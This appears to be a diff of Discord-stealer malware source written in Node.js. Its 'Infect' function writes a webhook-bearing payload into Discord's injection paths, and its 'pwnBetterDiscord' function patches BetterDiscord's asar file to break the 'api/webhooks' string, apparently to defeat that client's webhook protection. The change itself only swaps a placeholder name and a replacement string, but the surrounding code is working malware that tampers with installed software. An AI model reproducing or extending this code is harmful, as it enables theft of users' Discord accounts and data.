@@ -32,7 +32,7 @@ function Infect() {
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK%", webhook), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -93,7 +93,7 @@ function pwnBetterDiscord() {
     var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
         var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "Fraud"))
     } else {
         return;
     }
